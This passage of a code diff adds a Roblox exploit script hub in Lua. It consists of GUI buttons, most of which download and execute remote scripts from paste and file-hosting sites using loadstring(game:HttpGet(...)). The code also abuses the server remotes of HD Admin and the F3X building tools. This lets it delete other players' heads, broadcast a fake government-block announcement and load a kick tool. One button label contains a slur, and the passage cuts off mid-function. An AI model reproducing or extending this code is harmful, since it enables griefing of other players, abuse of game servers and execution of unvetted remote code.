+                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
+            } 
+        } 
+    }
+
+    
+    _(argsCreate)
+    _(argsSync)
+end
+
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Players = game:GetService("Players")
+
+local UserInputService = game:GetService("UserInputService")
+
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+
+
+
+
+local player = Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+    
+RequestCommand:InvokeServer(";removeaccessories")
+RequestCommand:InvokeServer(";titlebk me John Doe")
+
+wait(1)
+RequestCommand:InvokeServer(";hat me 107676946962151")
+wait(0.5)
+RequestCommand:InvokeServer(";hat me 18196403126")
+wait(0.5)
+RequestCommand:InvokeServer(";hat me 18801497637")
+wait(0.5)
+ RequestCommand:InvokeServer(";shirt me 100276101149100")
+ RequestCommand:InvokeServer(";pants me 109662040845019")
+RequestCommand:InvokeServer(";head me 0")
+RequestCommand:InvokeServer(";face me 144075659")
+
+
+wait(1)
+
+local eye = char:FindFirstChild("Accessory (JohnEye)").Handle
+local arm = char:FindFirstChild("Right Arm")
+local tor = char:FindFirstChild("Torso")
+local ar2 = char:FindFirstChild("Left Arm")
+
+local RLeg = char:FindFirstChild("Right Leg")
+local head = char:FindFirstChild("Head")
+local LLeg = char:FindFirstChild("Left Leg")
+applyDecorationToPart(arm)
+applyDecorationToPart(ar2)
+eyePart(eye)
+Parter(tor)
+
+Color(arm, Color3.fromRGB(252, 255, 150))
+Color(ar2, Color3.fromRGB(252, 255, 150))
+Color(head, Color3.fromRGB(252, 255, 150))
+Color(tor, Color3.fromRGB(255, 255, 0))
+Color(RLeg, Color3.fromRGB(0, 200, 255))
+Color(LLeg, Color3.fromRGB(0, 200, 255))
+
+
+
+local arm = character:FindFirstChild("Right Arm") 
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+
+local isDead = false
+
+humanoid.Died:Connect(function()
+	isDead = true
+end)
+
+
+local animator = humanoid:FindFirstChildOfClass("Animator")
+
+local attackAnim = Instance.new("Animation")
+attackAnim.AnimationId = "rbxassetid://186934658"
+local attackTrack = animator:LoadAnimation(attackAnim)
+
+function KillTarget(target)
+    if target and target.Character then
+        local head = target.Character:FindFirstChild("Head")
+        if head then
+            local args = {
+                [1] = "SetLocked",
+                [2] = {
+                    [1] = head
+                },
+
+                [3] = false
+            }
+            remote:InvokeServer(unpack(args))
+            task.wait(0.1) 
+            local args2 = {
+                [1] = "Remove",
+                [2] = {
+                    [1] = head
+                }
+            }
+            remote:InvokeServer(unpack(args2))
+        end
+    end
+end
+
+
+local function attack()
+    attackTrack:Play() 
+    local hitPlayer = nil
+    local touchedConnection
+
+    local function onTouch(other)
+        local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
+        if otherPlayer and otherPlayer ~= player then
+            hitPlayer = otherPlayer
+        end
+    end
+
+    touchedConnection = arm.Touched:Connect(onTouch)
+    task.wait(0.5)
+    if touchedConnection then
+        touchedConnection:Disconnect()
+    end
+    if hitPlayer then
+               RequestCommand:InvokeServer(" ")
+  
+KillTarget(hitPlayer)
+        task.wait(1)
+        
+    end
+
+end
+
+
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.Name = "AttackButtonGui"
+
+local attackButton = Instance.new("TextButton")
+attackButton.Name = "AttackButton"
+attackButton.Parent = screenGui
+attackButton.Size = UDim2.new(0, 160, 0, 50)
+attackButton.Position = UDim2.new(0.5, -80, 1, -90)
+attackButton.AnchorPoint = Vector2.new(0.5, 0)
+attackButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+attackButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+attackButton.Font = Enum.Font.GothamBold
+attackButton.Text = "attack"
+attackButton.TextSize = 22
+attackButton.AutoButtonColor = true
+attackButton.ZIndex = 999
+
+
+attackButton.MouseButton1Click:Connect(function()
+	if not isDead then
+		attack()
+	end
+end)
+
+
+
+loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/ac3768adf302d0b28e71fc89ab46dcd4/raw/6ad0f8cc313a5541f884768c7f75abd62aee377e/John%2520Doe%2520Trial"))()
+
+end)
+
+dog.Name = "dog"
+dog.Parent = scriptspage2
+dog.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+dog.BorderColor3 = Color3.fromRGB(129, 26, 255)
+dog.BorderSizePixel = 2
+dog.Position = UDim2.new(0.752735257, 0, 0.0348278582, 0)
+dog.Size = UDim2.new(0, 99, 0, 29)
+dog.Font = Enum.Font.Arial
+dog.Text = "Doggo Army"
+dog.TextColor3 = Color3.fromRGB(255, 255, 255)
+dog.TextScaled = true
+dog.TextSize = 18.000
+dog.TextWrapped = true
+dog.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/umyNSGfy/raw"))()
+end)
+
+mosque_3.Name = "mosque"
+mosque_3.Parent = scriptspage2
+mosque_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mosque_3.BorderColor3 = Color3.fromRGB(129, 26, 255)
+mosque_3.BorderSizePixel = 2
+mosque_3.Position = UDim2.new(0.0306345727, 0, 0.160714284, 0)
+mosque_3.Size = UDim2.new(0, 104, 0, 29)
+mosque_3.Font = Enum.Font.Arial
+mosque_3.Text = "Mosque2"
+mosque_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+mosque_3.TextScaled = true
+mosque_3.TextSize = 18.000
+mosque_3.TextWrapped = true
+mosque_3.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/bNzaQ66f/raw"))()
+wait(10)
+loadstring(game:HttpGet("https://files.catbox.moe/8e8ivx.txt"))()
+end)
+
+ssp2.Name = "ssp 2"
+ssp2.Parent = scriptspage2
+ssp2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ssp2.BorderColor3 = Color3.fromRGB(129, 26, 255)
+ssp2.BorderSizePixel = 2
+ssp2.Position = UDim2.new(0.271334797, 0, 0.160714284, 0)
+ssp2.Size = UDim2.new(0, 104, 0, 29)
+ssp2.Font = Enum.Font.Arial
+ssp2.Text = "Converted SSP"
+ssp2.TextColor3 = Color3.fromRGB(255, 255, 255)
+ssp2.TextScaled = true
+ssp2.TextSize = 18.000
+ssp2.TextWrapped = true
+ssp2.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/k8wxil.txt"))()
+end)
+
+laser.Name = "laser"
+laser.Parent = scriptspage2
+laser.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+laser.BorderColor3 = Color3.fromRGB(129, 26, 255)
+laser.BorderSizePixel = 2
+laser.Position = UDim2.new(0.512035012, 0, 0.160714284, 0)
+laser.Size = UDim2.new(0, 104, 0, 29)
+laser.Font = Enum.Font.Arial
+laser.Text = "Laser Gun"
+laser.TextColor3 = Color3.fromRGB(255, 255, 255)
+laser.TextScaled = true
+laser.TextSize = 18.000
+laser.TextWrapped = true
+laser.MouseButton1Click:Connect(function()
+rq:InvokeServer(";gear me 130113146")
+end)
+
+china.Name = "china"
+china.Parent = scriptspage2
+china.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+china.BorderColor3 = Color3.fromRGB(129, 26, 255)
+china.BorderSizePixel = 2
+china.Position = UDim2.new(0.752735257, 0, 0.159827858, 0)
+china.Size = UDim2.new(0, 99, 0, 29)
+china.Font = Enum.Font.Arial
+china.Text = "Chinese Announcement"
+china.TextColor3 = Color3.fromRGB(255, 255, 255)
+china.TextScaled = true
+china.TextSize = 18.000
+china.TextWrapped = true
+china.MouseButton1Click:Connect(function()
+rq:InvokeServer(";sh This game has been blocked by the Chinese government")
+end)
+
+bean.Name = "bean"
+bean.Parent = scriptspage2
+bean.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bean.BorderColor3 = Color3.fromRGB(129, 26, 255)
+bean.BorderSizePixel = 2
+bean.Position = UDim2.new(0.0306345727, 0, 0.285714298, 0)
+bean.Size = UDim2.new(0, 104, 0, 29)
+bean.Font = Enum.Font.Arial
+bean.Text = "Mr.Bean Admin (REAL VERSION)"
+bean.TextColor3 = Color3.fromRGB(255, 255, 255)
+bean.TextScaled = true
+bean.TextSize = 18.000
+bean.TextWrapped = true
+bean.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/stus10.txt"))()
+end)
+
+patrik.Name = "patrik"
+patrik.Parent = scriptspage2
+patrik.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+patrik.BorderColor3 = Color3.fromRGB(129, 26, 255)
+patrik.BorderSizePixel = 2
+patrik.Position = UDim2.new(0.271334797, 0, 0.285714298, 0)
+patrik.Size = UDim2.new(0, 104, 0, 29)
+patrik.Font = Enum.Font.Arial
+patrik.Text = "Patrick :0"
+patrik.TextColor3 = Color3.fromRGB(255, 255, 255)
+patrik.TextScaled = true
+patrik.TextSize = 18.000
+patrik.TextWrapped = true
+patrik.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/gXiit5tE/raw"))()
+end)
+
+kitchen.Name = "kitchen"
+kitchen.Parent = scriptspage2
+kitchen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+kitchen.BorderColor3 = Color3.fromRGB(129, 26, 255)
+kitchen.BorderSizePixel = 2
+kitchen.Position = UDim2.new(0.512035012, 0, 0.285714298, 0)
+kitchen.Size = UDim2.new(0, 104, 0, 29)
+kitchen.Font = Enum.Font.Arial
+kitchen.Text = "Bombo Knife"
+kitchen.TextColor3 = Color3.fromRGB(255, 255, 255)
+kitchen.TextScaled = true
+kitchen.TextSize = 18.000
+kitchen.TextWrapped = true
+kitchen.MouseButton1Click:Connect(function()
+rq:InvokeServer(";gear me 121946387")
+end)
+
+virus.Name = "virus"
+virus.Parent = scriptspage2
+virus.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+virus.BorderColor3 = Color3.fromRGB(129, 26, 255)
+virus.BorderSizePixel = 2
+virus.Position = UDim2.new(0.752735257, 0, 0.284827858, 0)
+virus.Size = UDim2.new(0, 99, 0, 29)
+virus.Font = Enum.Font.Arial
+virus.Text = "Infection"
+virus.TextColor3 = Color3.fromRGB(255, 255, 255)
+virus.TextScaled = true
+virus.TextSize = 18.000
+virus.TextWrapped = true
+virus.MouseButton1Click:Connect(function()
+rq:InvokeServer(";paint me white")
+end)
+
+rocky.Name = "rocky"
+rocky.Parent = scriptspage2
+rocky.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+rocky.BorderColor3 = Color3.fromRGB(129, 26, 255)
+rocky.BorderSizePixel = 2
+rocky.Position = UDim2.new(0.0306345727, 0, 0.418692946, 0)
+rocky.Size = UDim2.new(0, 104, 0, 29)
+rocky.Font = Enum.Font.Arial
+rocky.Text = "Rocky2u's Admin"
+rocky.TextColor3 = Color3.fromRGB(255, 255, 255)
+rocky.TextScaled = true
+rocky.TextSize = 18.000
+rocky.TextWrapped = true
+rocky.MouseButton1Click:Connect(function()
+str_srce = "14682300022" loadstring(game:GetObjects("rbxassetid://"..str_srce)[1].Source)()
+end)
+
+yield.Name = "yield"
+yield.Parent = scriptspage2
+yield.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+yield.BorderColor3 = Color3.fromRGB(129, 26, 255)
+yield.BorderSizePixel = 2
+yield.Position = UDim2.new(0.512035012, 0, 0.418692887, 0)
+yield.Size = UDim2.new(0, 104, 0, 29)
+yield.Font = Enum.Font.Arial
+yield.Text = "[FE] Infinite Yield"
+yield.TextColor3 = Color3.fromRGB(255, 255, 255)
+yield.TextScaled = true
+yield.TextSize = 18.000
+yield.TextWrapped = true
+yield.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/346cpb.txt"))()
+end)
+
+cina.Name = "cina"
+cina.Parent = scriptspage2
+cina.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+cina.BorderColor3 = Color3.fromRGB(129, 26, 255)
+cina.BorderSizePixel = 2
+cina.Position = UDim2.new(0.752735257, 0, 0.41697073, 0)
+cina.Size = UDim2.new(0, 99, 0, 29)
+cina.Font = Enum.Font.Arial
+cina.Text = "China"
+cina.TextColor3 = Color3.fromRGB(255, 255, 255)
+cina.TextScaled = true
+cina.TextSize = 18.000
+cina.TextWrapped = true
+cina.MouseButton1Click:Connect(function()
+rq:InvokeServer(";music 121922837560201 ;pitch 0.221 ;volume inf")
+loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/01f820adf9cd307fa1032d3f03235ea3/raw/491f81d1f01c727b137001313da62695f5101be3/gistfile1.txt"))()
+end)
+
+mc.Name = "mc"
+mc.Parent = scriptspage2
+mc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mc.BorderColor3 = Color3.fromRGB(129, 26, 255)
+mc.BorderSizePixel = 2
+mc.Position = UDim2.new(0.0306345727, 0, 0.543692887, 0)
+mc.Size = UDim2.new(0, 104, 0, 29)
+mc.Font = Enum.Font.Arial
+mc.Text = "Steve"
+mc.TextColor3 = Color3.fromRGB(255, 255, 255)
+mc.TextScaled = true
+mc.TextSize = 18.000
+mc.TextWrapped = true
+mc.MouseButton1Click:Connect(function()
+rq:InvokeServer(";r15")
+wait(1)
+rq:InvokeServer(";char me q_rc7")
+wait(1)
+rq:InvokeServer(";bundle me 46771")
+wait(1)
+rq:InvokeServer(";shirt me 16512333409")
+wait(1)
+rq:InvokeServer(";pants me 14955922682")
+wait(1)
+loadstring(game:HttpGet("https://pastebin.com/raw/pJ7r63eC"))()
+rq:InvokeServer(";head me 0")
+wait(1)
+rq:InvokeServer(";hat me 128875258353354")
+loadstring(game:HttpGet("https://pastebin.com/raw/X6XxjFbx"))()
+local player = game.Players.LocalPlayer
+local Character = player.Character or player.CharacterAdded:Wait()
+local HMD = Character.HumanoidRootPart
+
+function GitAud(soundgit,filename)
+    SoundName=tostring(SoundName)
+    local url=soundgit
+    local FileName = filename
+    writefile(FileName..".mp3", game:HttpGet(url))
+    return (getcustomasset or getsynasset)(FileName..".mp3")
+end
+
+function CustomGitSound(soundlink, vol, filename)
+local BGMusic = Instance.new("Sound")
+    BGMusic.SoundId = GitAud(soundlink, filename)
+    BGMusic.Parent = HMD
+    BGMusic.Volume = 2
+    BGMusic.Name = "BGM_MUSIC"
+    BGMusic.Looped = true
+    BGMusic:Play()
+end
+
+
+
+
+local player = game.Players.LocalPlayer
+local char = player.Character
+local tool
+for i,v in player:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+for i,v in game.ReplicatedStorage:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+
+remote = tool.SyncAPI.ServerEndpoint
+function _(args)
+    remote:InvokeServer(unpack(args))
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Players = game:GetService("Players")
+
+local UserInputService = game:GetService("UserInputService")
+
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+
+local player = Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+
+local arm = character:FindFirstChild("Right Arm")
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+
+local isDead = false
+
+humanoid.Died:Connect(function()
+	isDead = true
+end)
+
+
+local animator = humanoid:FindFirstChildOfClass("Animator")
+
+local attackAnim = Instance.new("Animation")
+attackAnim.AnimationId = "rbxassetid://110361063508944"
+local attackTrack = animator:LoadAnimation(attackAnim)
+attackTrack.Priority = Enum.AnimationPriority.Action
+
+
+function KillTarget(target)
+    if target and target.Character then
+        local head = target.Character:FindFirstChild("Head")
+        if head then
+            local args = {
+                [1] = "SetLocked",
+                [2] = {
+                    [1] = head
+                },
+
+                [3] = false
+            }
+            remote:InvokeServer(unpack(args))
+            task.wait(0.1) 
+            local args2 = {
+                [1] = "Remove",
+                [2] = {
+                    [1] = head
+                }
+            }
+            remote:InvokeServer(unpack(args2))
+        end
+    end
+end
+
+
+local function attack()
+    attackTrack:Play() 
+    local hitPlayer = nil
+    local touchedConnection
+
+    local function onTouch(other)
+        local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
+        if otherPlayer and otherPlayer ~= player then
+            hitPlayer = otherPlayer
+        end
+    end
+
+    touchedConnection = arm.Touched:Connect(onTouch)
+    task.wait(0.5)
+    if touchedConnection then
+        touchedConnection:Disconnect()
+    end
+    if hitPlayer then
+               RequestCommand:InvokeServer(" ")
+        KillTarget(hitPlayer)
+        wait(1)
+        
+    end
+
+end
+
+UserInputService.TouchStarted:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+
+    if isDead then return end 
+    attack()
+end)
+end)
+
+c4.Name = "c4"
+c4.Parent = scriptspage2
+c4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+c4.BorderColor3 = Color3.fromRGB(129, 26, 255)
+c4.BorderSizePixel = 2
+c4.Position = UDim2.new(0.271334797, 0, 0.543692887, 0)
+c4.Size = UDim2.new(0, 104, 0, 29)
+c4.Font = Enum.Font.Arial
+c4.Text = "Airstrike"
+c4.TextColor3 = Color3.fromRGB(255, 255, 255)
+c4.TextScaled = true
+c4.TextSize = 18.000
+c4.TextWrapped = true
+c4.MouseButton1Click:Connect(function()
+rq:InvokeServer(";gear me 88885539")
+end)
+
+summon.Name = "summon"
+summon.Parent = scriptspage2
+summon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+summon.BorderColor3 = Color3.fromRGB(129, 26, 255)
+summon.BorderSizePixel = 2
+summon.Position = UDim2.new(0.512035012, 0, 0.543692887, 0)
+summon.Size = UDim2.new(0, 104, 0, 29)
+summon.Font = Enum.Font.Arial
+summon.Text = "Spawn N*obs"
+summon.TextColor3 = Color3.fromRGB(255, 255, 255)
+summon.TextScaled = true
+summon.TextSize = 18.000
+summon.TextWrapped = true
+summon.MouseButton1Click:Connect(function()
+rq:InvokeServer(";insert 27410797")
+end)
+
+bv.Name = "bv"
+bv.Parent = scriptspage2
+bv.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bv.BorderColor3 = Color3.fromRGB(129, 26, 255)
+bv.BorderSizePixel = 2
+bv.Position = UDim2.new(0.752735257, 0, 0.541970849, 0)
+bv.Size = UDim2.new(0, 99, 0, 29)
+bv.Font = Enum.Font.Arial
+bv.Text = "Goner"
+bv.TextColor3 = Color3.fromRGB(255, 255, 255)
+bv.TextScaled = true
+bv.TextSize = 18.000
+bv.TextWrapped = true
+bv.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/lr7247.txt"))()
+end)
+
+ploit.Name = "ploit"
+ploit.Parent = scriptspage2
+ploit.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ploit.BorderColor3 = Color3.fromRGB(129, 26, 255)
+ploit.BorderSizePixel = 2
+ploit.Position = UDim2.new(0.271334797, 0, 0.41785714, 0)
+ploit.Size = UDim2.new(0, 104, 0, 29)
+ploit.Font = Enum.Font.Arial
+ploit.Text = "Kiddnapp police"
+ploit.TextColor3 = Color3.fromRGB(255, 255, 255)
+ploit.TextScaled = true
+ploit.TextSize = 18.000
+ploit.TextWrapped = true
+ploit.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/Qg93HAkl/raw"))()
+end)
+
+hamer.Name = "hamer"
+hamer.Parent = scriptspage2
+hamer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+hamer.BorderColor3 = Color3.fromRGB(129, 26, 255)
+hamer.BorderSizePixel = 2
+hamer.Position = UDim2.new(0.0306345727, 0, 0.668692887, 0)
+hamer.Size = UDim2.new(0, 104, 0, 29)
+hamer.Font = Enum.Font.Arial
+hamer.Text = "Sledge Hammer"
+hamer.TextColor3 = Color3.fromRGB(255, 255, 255)
+hamer.TextScaled = true
+hamer.TextSize = 18.000
+hamer.TextWrapped = true
+hamer.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/aGPGIrjN/raw"))()
+end)
+
+baby.Name = "baby"
+baby.Parent = scriptspage2
+baby.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+baby.BorderColor3 = Color3.fromRGB(129, 26, 255)
+baby.BorderSizePixel = 2
+baby.Position = UDim2.new(0.271334797, 0, 0.668692887, 0)
+baby.Size = UDim2.new(0, 104, 0, 29)
+baby.Font = Enum.Font.Arial
+baby.Text = "Dababy Car"
+baby.TextColor3 = Color3.fromRGB(255, 255, 255)
+baby.TextScaled = true
+baby.TextSize = 18.000
+baby.TextWrapped = true
+baby.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/0QRXEbbv/raw"))()
+end)
+
+kik.Name = "kik"
+kik.Parent = scriptspage2
+kik.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+kik.BorderColor3 = Color3.fromRGB(129, 26, 255)
+kik.BorderSizePixel = 2
+kik.Position = UDim2.new(0.512035012, 0, 0.668692887, 0)
+kik.Size = UDim2.new(0, 104, 0, 29)
+kik.Font = Enum.Font.Arial
+kik.Text = "Kick Gui --> PW: Free Scripts"
+kik.TextColor3 = Color3.fromRGB(255, 255, 255)
+kik.TextScaled = true
+kik.TextSize = 18.000
+kik.TextWrapped = true
+kik.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/ZESwgTVK/raw"))()
+end)
+
+c0l.Name = "c0l"
+c0l.Parent = scriptspage2
+c0l.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+c0l.BorderColor3 = Color3.fromRGB(129, 26, 255)
+c0l.BorderSizePixel = 2
+c0l.Position = UDim2.new(0.752735257, 0, 0.668692887, 0)
+c0l.Size = UDim2.new(0, 99, 0, 29)
+c0l.Font = Enum.Font.Arial
+c0l.Text = "c00lgui"
+c0l.TextColor3 = Color3.fromRGB(255, 255, 255)
+c0l.TextScaled = true
+c0l.TextSize = 18.000
+c0l.TextWrapped = true
+c0l.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet('https://files.catbox.moe/scqhar.txt'))()
+end)
+
+nds.Name = "nds"
+nds.Parent = scriptspage2
+nds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+nds.BorderColor3 = Color3.fromRGB(129, 26, 255)
+nds.BorderSizePixel = 2
+nds.Position = UDim2.new(0.0306345727, 0, 0.793692887, 0)
+nds.Size = UDim2.new(0, 104, 0, 29)
+nds.Font = Enum.Font.Arial
+nds.Text = "Natural Disaster Survival"
+nds.TextColor3 = Color3.fromRGB(255, 255, 255)
+nds.TextScaled = true
+nds.TextSize = 18.000
+nds.TextWrapped = true
+nds.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/WLoE4bVy/raw"))()
+end)
+
+cart.Name = "cart"
+cart.Parent = scriptspage2
+cart.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+cart.BorderColor3 = Color3.fromRGB(129, 26, 255)
+cart.BorderSizePixel = 2
+cart.Position = UDim2.new(0.271334797, 0, 0.793692887, 0)
+cart.Size = UDim2.new(0, 104, 0, 29)
+cart.Font = Enum.Font.Arial
+cart.Text = "Cart Ride"
+cart.TextColor3 = Color3.fromRGB(255, 255, 255)
+cart.TextScaled = true
+cart.TextSize = 18.000
+cart.TextWrapped = true
+cart.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/4l4OTxQu/raw"))()
+end)
+
+GK.Name = "GK"
+GK.Parent = scriptspage2
+GK.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+GK.BorderColor3 = Color3.fromRGB(129, 26, 255)
+GK.BorderSizePixel = 2
+GK.Position = UDim2.new(0.512035012, 0, 0.793692887, 0)
+GK.Size = UDim2.new(0, 104, 0, 29)
+GK.Font = Enum.Font.Arial
+GK.Text = "Grab Knife"
+GK.TextColor3 = Color3.fromRGB(255, 255, 255)
+GK.TextScaled = true
+GK.TextSize = 18.000
+GK.TextWrapped = true
+GK.MouseButton1Click:Connect(function()
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+
+
+local Players = game:GetService("Players")
+
+local UserInputService = game:GetService("UserInputService")
+
+if not character:FindFirstChild('Accessory (KNIF4ELERFTAccessory)') or character:FindFirstChild("Accessory (Knife McGrabbington III)") then
+ready = false
+
+local function notify(msg)
+    local MainGUI = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI")
+    if not MainGUI then
+        MainGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+        MainGUI.Name = "MainGUI"
+    end
+
+    coroutine.wrap(function()
+        for _, v in pairs(MainGUI:GetChildren()) do
+            if v:IsA("TextLabel") then v:Destroy() end
+        end
+
+        local TextLabel = Instance.new("TextLabel")
+        local Frame = Instance.new("Frame")
+
+        TextLabel.Parent = MainGUI
+        TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+        TextLabel.BorderSizePixel = 0
+        TextLabel.Position = UDim2.new(0.2, 0, 0.05, -10)
+        TextLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
+        TextLabel.Font = Enum.Font.SourceSans
+        TextLabel.TextColor3 = Color3.new(1, 1, 1)
+        TextLabel.TextSize = 35
+        TextLabel.TextScaled = true
+        TextLabel.TextYAlignment = Enum.TextYAlignment.Center
+        TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+        TextLabel.Text = ""
+        TextLabel.BackgroundTransparency = 1
+
+        Frame.Parent = TextLabel
+        Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+        Frame.BorderSizePixel = 0
+        Frame.Transparency = 1
+        Frame.Position = UDim2.new(0, 0, 1, 0)
+        Frame.Size = UDim2.new(1, 0, 0, 5)
+
+        for i = 1, 8 do
+            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency - 0.1
+            TextLabel.Position = TextLabel.Position + UDim2.new(0, 0, 0, 1)
+            Frame.Transparency = Frame.Transparency - 0.1
+            task.wait()
+        end
+
+        msg = "  " .. msg
+        for i = 1, #msg do
+            TextLabel.Text = string.sub(msg, 1, i)
+            task.wait()
+        end
+
+        task.wait(1)
+
+        for i = 1, 8 do
+            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency + 0.1
+            TextLabel.Position = TextLabel.Position - UDim2.new(0, 0, 0, 2)
+            Frame.Transparency = Frame.Transparency + 0.1
+            task.wait()
+        end
+        TextLabel:Destroy()
+    end)()
+end
+
+
+RequestCommand:InvokeServer(";hat me 18268136683")
+
+yeah=player.Backpack:FindFirstChild('Building Tools') or player.Backpack:FindFirstChild('F3X Btools!')
+if yeah then
+notify("This game has f3x/you have f3x so everyone gonna see what you're doing.")
+task.wait(3)
+notify("Press 'Z' to equip.")
+elseif not yeah then
+notify("LOL this game has no btools or f3x so this not gonna work here")
+end
+
+local tool
+for _, v in player:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+for _, v in game.ReplicatedStorage:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+
+local remote = tool.SyncAPI.ServerEndpoint
+
+function _(args)
+    remote:InvokeServer(unpack(args))
+end
+function SetCollision(part, boolean)
+    local args = {
+        [1] = "SyncCollision",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["CanCollide"] = boolean
+            }
+        }
+    }
+    _(args)
+end
+    function SetLocked(part,boolean)
+        local args = {
+            [1] = "SetLocked",
+            [2] = {
+                [1] = part
+            },
+            [3] = boolean
+        }
+        _(args)
+    end
+function yerpp(E)
+local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = E,
+                ["DecorationType"] = "Sparkles"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = E,
+                ["DecorationType"] = "Sparkles",
+                ["SparkleColor"] = Color3.fromRGB(255, 255, 0)
+            } 
+        } 
+    }
+    _(argsCreate)
+    _(argsSync)
+end
+
+local knfe = character["Accessory (Knife McGrabbington III)"]
+
+if knfe then
+	local args = {
+		"Remove",
+		{
+			knfe.Handle.SpecialMesh
+		}
+	}
+
+	_(args)
+end
+
+local function Resize(part, size, ha)
+	local args = {
+		"SyncResize",
+		{
+			{
+				Part = part,
+				CFrame = ha,
+				Size = size
+			}
+		}
+	}
+	_(args)
+end
+
+local function SetAnchor(boolean, part)
+	local args = {
+		"SyncAnchor",
+		{
+			{
+				Part = part,
+				Anchored = boolean
+			}
+		}
+	}
+	_(args)
+end
+
+function MovePart(part, cf)
+    local args = {
+        [1] = "SyncMove",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["CFrame"] = cf
+            }
+        }
+    }
+    _(args)
+end
+
+local function Color(part, color)
+	local args = {
+		"SyncColor",
+		{
+			{
+				Part = part,
+				Color = color,
+				UnionColoring = false
+			}
+		}
+	}
+	_(args)
+end
+function AddMesh(part)
+    local args = {
+        [1] = "CreateMeshes",
+        [2] = {
+            [1] = {
+                ["Part"] = part
+            }
+        }
+    }
+    _(args)
+end
+
+    function DestroyPart(part)
+        local args = {
+            [1] = "Remove",
+            [2] = {
+                [1] = part
+            }
+        }
+        _(args)
+    end
+
+	function SetMesh(part,meshid,offseter)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+            ["Offset"] = offseter,
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+function SetTexture(part, texid)
+    local args = {
+        [1] = "SyncMesh",
+        [2] = {
+            [1] = {
